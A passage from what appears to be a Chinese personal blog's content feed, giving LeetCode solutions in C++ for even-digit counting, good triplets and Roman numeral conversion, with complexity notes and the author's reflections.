class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/find-numbers-with-even-number-of-digits/solution/tong-ji-wei-shu-wei-ou-shu-de-shu-zi-by-leetcode-s/">官方题解</a>:</h6><p><strong>方法一：枚举 + 字符串</strong><br>我们枚举数组 <code>nums</code> 中的整数，并依次判断每个整数 <code>x</code> 是否包含偶数个数字。</p>
<p>一种简单的方法是使用语言内置的整数转字符串函数，将 <code>x</code> 转换为字符串后，判断其长度是否为偶数即可。</p>
<p><strong>c++代码：</strong>（执行16ms，击败43.91%，内存10M，击败12.53%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">findNumbers</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> num: nums) &#123;</span><br><span class="line">            <span class="keyword">if</span> (to_string(num).size() % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">                ++ans;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li><p>时间复杂度：$O(N)$，其中 $N$ 是数组 <code>nums</code> 的长度。这里假设将整数转换为字符串的时间复杂度为 $O(1)$。</p>
</li>
<li><p>空间复杂度：$O(1)$。</p>
</li>
</ul>
<p><strong>方法二：枚举 + 数学</strong><br>我们也可以使用语言内置的以 <code>10</code> 为底的对数函数 <code>log10()</code> 来得到整数 <code>x</code> 包含的数字个数。</p>
<p>一个包含 <code>k</code> 个数字的整数 <code>x</code> 满足不等式 $10^{k-1} ≤x&lt;10^k$ 。将不等式取对数，得到 $k - 1 \leq \log_{10}(x) &lt; k$，因此我们可以用 $k = \lfloor\log_{10}(x) + 1⌋$得到 <code>x</code> 包含的数字个数 <code>k</code>，其中 $\lfloor a ⌋$表示将 $a$ 进行下取整，例如 $\lfloor 5.2 \rfloor$ = 5⌊5.2⌋=5。</p>
<p><strong>c++代码：</strong>（执行20ms，击败16.37%，内存10.4M，击败5.09%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">findNumbers</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> num: nums) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((<span class="keyword">int</span>)(<span class="built_in">log10</span>(num) + <span class="number">1</span>) % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">                ++ans;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>题目多种解法，官方题解第一种即是我思路里的第二种方法，也挺好不错。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>统计好三元组</title>
    <url>/2020/11/10/%E7%BB%9F%E8%AE%A1%E5%A5%BD%E4%B8%89%E5%85%83%E7%BB%84/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/count-good-triplets/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给你一个整数数组 <code>arr</code> ，以及 <code>a</code>、<code>b</code> 、<code>c</code> 三个整数。请你统计其中好三元组的数量。</p>
<p>如果三元组 <code>(arr[i], arr[j], arr[k])</code> 满足下列全部条件，则认为它是一个 <strong>好三元组</strong> 。</p>
<ul>
<li><code>0 &lt;= i &lt; j &lt; k &lt; arr.length</code></li>
<li><code>|arr[i] - arr[j]| &lt;= a</code></li>
<li><code>|arr[j] - arr[k]| &lt;= b</code></li>
<li><code>|arr[i] - arr[k]| &lt;= c</code></li>
</ul>
<p>其中 <code>|x|</code> 表示 <code>x</code> 的绝对值。</p>
<p>返回 <strong>好三元组的数量</strong> 。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：arr &#x3D; [3,0,1,1,9,7], a &#x3D; 7, b &#x3D; 2, c &#x3D; 3</span><br><span class="line">输出：4</span><br><span class="line">解释：一共有 4 个好三元组：[(3,0,1), (3,0,1), (3,1,1), (0,1,1)] 。</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：arr &#x3D; [1,1,2,2,3], a &#x3D; 0, b &#x3D; 0, c &#x3D; 1</span><br><span class="line">输出：0</span><br><span class="line">解释：不存在满足所有条件的三元组。</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li><code>3 &lt;= arr.length &lt;= 100</code></li>
<li><code>0 &lt;= arr[i] &lt;= 1000</code></li>
<li><code>0 &lt;= a, b, c &lt;= 1000</code></li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>暴力解法，三层for循环遍历，每层代表一个三元组中的元素。对每组(i,j,k)，判断arr[i]、arr[j]、arr[k]是否满足条件。</p>
<p>这种解法时间复杂度是$O(n^3)$，看题解有没有好方法吧。</p>
<p><strong>c++代码：</strong>(执行用时64ms，击败14.93%，内存消耗8.6M，击败5.00%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">countGoodTriplets</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; arr, <span class="keyword">int</span> a, <span class="keyword">int</span> b, <span class="keyword">int</span> c)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//根据题目描述直接模拟即可</span></span><br><span class="line">        <span class="keyword">int</span> result=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;arr.size()<span class="number">-2</span>;++i)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=i+<span class="number">1</span>;j&lt;arr.size()<span class="number">-1</span>;++j)&#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> k=j+<span class="number">1</span>;k&lt;arr.size();++k)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(<span class="built_in">abs</span>(arr[i]-arr[j])&lt;=a &amp;&amp; <span class="built_in">abs</span>(arr[j]-arr[k])&lt;=b &amp;&amp; <span class="built_in">abs</span>(arr[i]-arr[k])&lt;=c)&#123;</span><br><span class="line">                        ++result;</span><br><span class="line">                     &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/count-good-triplets/solution/tong-ji-hao-san-yuan-zu-by-leetcode-solution/">官方题解</a>:</h6><p><strong>方法一：枚举</strong><br><strong>思路与算法</strong></p>
<p>用 $O(n^3)$  的循环依次枚举所有的 $(i, j, k)$，这里 $0 \leq i &lt; j &lt; k &lt; {\rm arr.length}$，对于每组 (i, j, k)(i,j,k)，判断 ${\rm arr}[i]$、${\rm arr}[j]$、${\rm arr}[k]$是否满足条件。</p>
<p>最终统计出所有满足条件的三元组的数量。</p>
<p><strong>c++代码：</strong>（执行56ms，击败38.19%，内存8.4M，击败9.00%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">countGoodTriplets</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; arr, <span class="keyword">int</span> a, <span class="keyword">int</span> b, <span class="keyword">int</span> c)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = arr.size(), cnt = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = i + <span class="number">1</span>; j &lt; n; ++j) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> k = j + <span class="number">1</span>; k &lt; n; ++k) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="built_in">abs</span>(arr[i] - arr[j]) &lt;= a &amp;&amp; <span class="built_in">abs</span>(arr[j] - arr[k]) &lt;= b &amp;&amp; <span class="built_in">abs</span>(arr[i] - arr[k]) &lt;= c) &#123;</span><br><span class="line">                        ++cnt;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> cnt;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：$O(n^3)$，其中 $n$是数组 $\textit{arr}$ 的长度。</li>
<li>空间复杂度：$O(1)$。</li>
</ul>
<p><strong>方法二：枚举优化</strong></p>
<p><strong>思路与算法</strong></p>
<p>我们考虑 $O(n^2)$ 枚举满足 $|\rm arr[j]-\rm arr[k]|\le b∣$ 的二元组 $(j,k)$，统计这个二元组下有多少 $i$ 满足条件。由题目已知 $i$ 的限制条件为 $|\rm arr[i]-\rm arr[j]|\le a \ \&amp;\&amp;\ |\rm arr[i]-\rm arr[k]|\le c∣$，我们可以拆开绝对值，得到符合条件的值一定是 $[\rm arr[j]-a,\rm arr[j]+a]$ 和 $[\rm arr[k]-c,\rm arr[k]+c]$ 两个区间的交集，我们记为 $[l,r]$。因此，在枚举 $(j,k)$这个二元组的时候，我们只需要快速统计出满足 $i&lt;j$ 且 $\rm arr[i]$的值域范围在 $[l,r]$ 的 $i$ 的个数即可。</p>
<p>很容易想到维护一个 $\rm arr[i]$频次数组的前缀和 $\rm sum$，对于一个二元组 $(j,k)$，我们可以 $O(1)$ 得到答案为 $\rm sum[r]-\rm sum[l-1]$。考虑怎么维护保证当前频次数组存的数的下标符合 $i&lt;j$ 的限制，我们只要从小到大枚举 $j$，每次 $j$移动指针加一的时候，将 $\rm arr[j]$的值更新到 $\rm sum$数组中即可，这样能保证枚举到 $j$的时候 $\rm sum$数组里存的值的下标满足限制。</p>
<p>「将 $\rm arr[j]$ 的值更新到 $\rm sum$数组中」这个操作在本方法中是暴力更新，因为数组的值域上限很小，有能力的读者可以考虑怎么在进一步优化这一部分的复杂度，可以从离散化或者树状数组的角度考虑，这里不再赘述。</p>
<p><strong>c++代码：</strong>（执行24ms，击败97.15%，内存9M，击败5.00%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">countGoodTriplets</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; arr, <span class="keyword">int</span> a, <span class="keyword">int</span> b, <span class="keyword">int</span> c)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> ans = <span class="number">0</span>, n = arr.size();</span><br><span class="line">        <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">sum</span><span class="params">(<span class="number">1001</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n; ++j) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> k = j + <span class="number">1</span>; k &lt; n; ++k) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">abs</span>(arr[j] - arr[k]) &lt;= b) &#123;</span><br><span class="line">                    <span class="keyword">int</span> lj = arr[j] - a, rj = arr[j] + a;</span><br><span class="line">                    <span class="keyword">int</span> lk = arr[k] - c, rk = arr[k] + c;</span><br><span class="line">                    <span class="keyword">int</span> l = max(<span class="number">0</span>, max(lj, lk)), r = min(<span class="number">1000</span>, min(rj, rk));</span><br><span class="line">                    <span class="keyword">if</span> (l &lt;= r) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (l == <span class="number">0</span>) &#123;</span><br><span class="line">                            ans += sum[r];</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span> &#123;</span><br><span class="line">                            ans += sum[r] - sum[l - <span class="number">1</span>];</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> k = arr[j]; k &lt;= <span class="number">1000</span>; ++k) &#123;</span><br><span class="line">                ++sum[k];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<p>时间复杂度：$O(n^2+nS)$，其中$n$ 是数组 $\textit{arr}$的长度，$S$为数组的值域上限，这里为 $1000$。</p>
<p>空间复杂度：$O(S)$。我们需要 $O(S)$ 的空间维护 $\rm arr[i]$频次数组的前缀和。</p>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>基本上简单题都可以通过暴力解出来，看来是真的😄，官方题解提供了另一种优化的枚举解法，可以学习一波。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>罗马数字转整数</title>
    <url>/2020/10/29/%E7%BD%97%E9%A9%AC%E6%95%B0%E5%AD%97%E8%BD%AC%E6%95%B4%E6%95%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><a href="https://leetcode-cn.com/problems/roman-to-integer/"><strong>题目地址</strong></a></p>
<p><strong>题目名称：</strong>罗马数字转整数</p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>罗马数字包含以下七种字符：<code>I</code>，<code>V</code>，<code>X</code>，<code>L</code>，<code>C</code>，<code>D</code>和<code>M</code>。</p>
<a id="more"></a>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">字符          数值</span><br><span class="line">I             1</span><br><span class="line">V             5</span><br><span class="line">X             10</span><br><span class="line">L             50</span><br><span class="line">C             100</span><br><span class="line">D             500</span><br><span class="line">M             1000</span><br></pre></td></tr></table></figure>
<p>例如， 罗马数字 2 写做 <code>II</code> ，即为两个并列的 1。12 写做 <code>XII</code> ，即为 <code>X</code> + <code>II</code> 。 27 写做  <code>XXVII</code>, 即为 <code>XX</code> + <code>V</code> + <code>II</code> 。</p>
<p>通常情况下，罗马数字中小的数字在大的数字的右边。但也存在特例，例如 4 不写做 <code>IIII</code>，而是 <code>IV</code>。数字 1 在数字 5 的左边，所表示的数等于大数 5 减小数 1 得到的数值 4 。同样地，数字 9 表示为 <code>IX</code>。这个特殊的规则只适用于以下六种情况：</p>
<ul>
<li><code>I</code> 可以放在 <code>V</code> (5) 和 <code>X</code> (10) 的左边，来表示 4 和 9。</li>
<li><code>X</code> 可以放在 <code>L</code> (50) 和 <code>C</code> (100) 的左边，来表示 40 和 90。 </li>
<li><code>C</code> 可以放在 <code>D</code> (500) 和 <code>M</code> (1000) 的左边，来表示 400 和 900。</li>
</ul>
<p>给定一个罗马数字，将其转换成整数。输入确保在 1 到 3999 的范围内。</p>
<p><strong>示例1：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">输入: <span class="string">&quot;III&quot;</span></span><br><span class="line">输出: <span class="number">3</span></span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">输入: <span class="string">&quot;IV&quot;</span></span><br><span class="line">输出: <span class="number">4</span></span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">输入: <span class="string">&quot;IX&quot;</span></span><br><span class="line">输出: <span class="number">9</span></span><br></pre></td></tr></table></figure>
<p><strong>示例4：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">输入: <span class="string">&quot;LVIII&quot;</span></span><br><span class="line">输出: <span class="number">58</span></span><br><span class="line">解释: L = <span class="number">50</span>, V= <span class="number">5</span>, III = <span class="number">3.</span></span><br></pre></td></tr></table></figure>
<p><strong>示例5：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">输入: <span class="string">&quot;MCMXCIV&quot;</span></span><br><span class="line">输出: <span class="number">1994</span></span><br><span class="line">解释: M = <span class="number">1000</span>, CM = <span class="number">900</span>, XC = <span class="number">90</span>, IV = <span class="number">4.</span></span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li>题目所给测试用例皆符合罗马数字书写规则，不会出现跨位等情况。</li>
<li>IC 和 IM 这样的例子并不符合题目要求，49 应该写作 XLIX，999 应该写作 CMXCIX 。</li>
<li>关于罗马数字的详尽书写规则，可以参考 <a href="https://b2b.partcommunity.com/community/knowledge/zh_CN/detail/10753/%E7%BD%97%E9%A9%AC%E6%95%B0%E5%AD%97#knowledge_article">罗马数字 - Mathematics</a> 。</li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>遍历字符串，把每个字符代表的数字加起来，因为本来就是加法操作，所以右加情况不用特殊处理，只需特殊处理左减情况，也就是当前字符是<code>I</code>、<code>X</code>、<code>C</code>时特殊处理。</p>
<p><strong>C++代码：</strong></p>
<p>下面是自己提交通过的代码（执行用时12ms，击败82.74%，内存消耗6.3M，击败62.60%）：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">romanToInt</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//存储转换后的整数</span></span><br><span class="line">        <span class="keyword">int</span> result=<span class="number">0</span>;</span><br><span class="line">        <span class="comment">//遍历s，只需特殊处理左减情况</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;s.length();i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(s[i]==<span class="string">&#x27;M&#x27;</span>)&#123;</span><br><span class="line">                result+=<span class="number">1000</span>;</span><br><span class="line"></span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(s[i]==<span class="string">&#x27;D&#x27;</span>)&#123;</span><br><span class="line">                result+=<span class="number">500</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(s[i]==<span class="string">&#x27;C&#x27;</span>)&#123;</span><br><span class="line">                <span class="comment">//不是最后一位</span></span><br><span class="line">                <span class="keyword">if</span>(i!=s.length()<span class="number">-1</span>)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(s[i+<span class="number">1</span>]==<span class="string">&#x27;D&#x27;</span>)&#123;</span><br><span class="line">                        <span class="comment">//CD表示400</span></span><br><span class="line">                        result+=<span class="number">400</span>;</span><br><span class="line">                        i++;</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(s[i+<span class="number">1</span>]==<span class="string">&#x27;M&#x27;</span>)&#123;</span><br><span class="line">                        <span class="comment">//CM表示900</span></span><br><span class="line">                        result+=<span class="number">900</span>;</span><br><span class="line">                        i++;</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//C是最后一位或者下一位不是D或M</span></span><br><span class="line">                result+=<span class="number">100</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(s[i]==<span class="string">&#x27;L&#x27;</span>)&#123;</span><br><span class="line">                result+=<span class="number">50</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(s[i]==<span class="string">&#x27;X&#x27;</span>)&#123;</span><br><span class="line">                <span class="comment">//不是最后一位</span></span><br><span class="line">                <span class="keyword">if</span>(i!=s.length()<span class="number">-1</span>)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(s[i+<span class="number">1</span>]==<span class="string">&#x27;L&#x27;</span>)&#123;</span><br><span class="line">                        <span class="comment">//XL表示40</span></span><br><span class="line">                        result+=<span class="number">40</span>;</span><br><span class="line">                        i++;</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(s[i+<span class="number">1</span>]==<span class="string">&#x27;C&#x27;</span>)&#123;</span><br><span class="line">                        <span class="comment">//LC表示90</span></span><br><span class="line">                        result+=<span class="number">90</span>;</span><br><span class="line">                        i++;</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//X是最后一位或者下一位不是L或C</span></span><br><span class="line">                result+=<span class="number">10</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(s[i]==<span class="string">&#x27;V&#x27;</span>)&#123;</span><br><span class="line">                result+=<span class="number">5</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(s[i]==<span class="string">&#x27;I&#x27;</span>)&#123;</span><br><span class="line">                <span class="comment">//不是最后一位</span></span><br><span class="line">                <span class="keyword">if</span>(i!=s.length()<span class="number">-1</span>)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(s[i+<span class="number">1</span>]==<span class="string">&#x27;V&#x27;</span>)&#123;</span><br><span class="line">                        <span class="comment">//IV表示4</span></span><br><span class="line">                        result+=<span class="number">4</span>;</span><br><span class="line">                        i++;</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(s[i+<span class="number">1</span>]==<span class="string">&#x27;X&#x27;</span>)&#123;</span><br><span class="line">                        <span class="comment">//IX表示9</span></span><br><span class="line">                        result+=<span class="number">9</span>;</span><br><span class="line">                        i++;</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//I是最后一位或者下一位不是V或X</span></span><br><span class="line">                result+=<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<p>好像没有官方题解没找到，不过自己提交的效率也还可以。</p>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>这道题是中午吃饭前看的，吃饭的时候想了一些，还挺好的，以后可以在脑海里存道题目，吃饭洗澡等空闲时可以多想一想，另外简单题越来越熟练了，继续加油吧🧐。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>能否连接形成数组</title>
    <url>/2020/11/10/%E8%83%BD%E5%90%A6%E8%BF%9E%E6%8E%A5%E5%BD%A2%E6%88%90%E6%95%B0%E7%BB%84/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/check-array-formation-through-concatenation/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给你一个整数数组 <code>arr</code> ，数组中的每个整数 互不相同 。另有一个由整数数组构成的数组 <code>pieces</code>，其中的整数也 互不相同 。请你以 任意顺序 连接 <code>pieces</code> 中的数组以形成 <code>arr</code> 。但是，不允许 对每个数组 <code>pieces[i]</code> 中的整数重新排序。</p>
<p>如果可以连接 <code>pieces</code> 中的数组形成 <code>arr</code> ，返回 <code>true</code> ；否则，返回 <code>false</code> 。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：arr &#x3D; [85], pieces &#x3D; [[85]]</span><br><span class="line">输出：true</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：arr &#x3D; [15,88], pieces &#x3D; [[88],[15]]</span><br><span class="line">输出：true</span><br><span class="line">解释：依次连接 [15] 和 [88]</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：arr &#x3D; [49,18,16], pieces &#x3D; [[16,18,49]]</span><br><span class="line">输出：false</span><br><span class="line">解释：即便数字相符，也不能重新排列 pieces[0]</span><br></pre></td></tr></table></figure>
<p><strong>示例4：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：arr &#x3D; [91,4,64,78], pieces &#x3D; [[78],[4,64],[91]]</span><br><span class="line">输出：true</span><br><span class="line">解释：依次连接 [91]、[4,64] 和 [78]</span><br></pre></td></tr></table></figure>
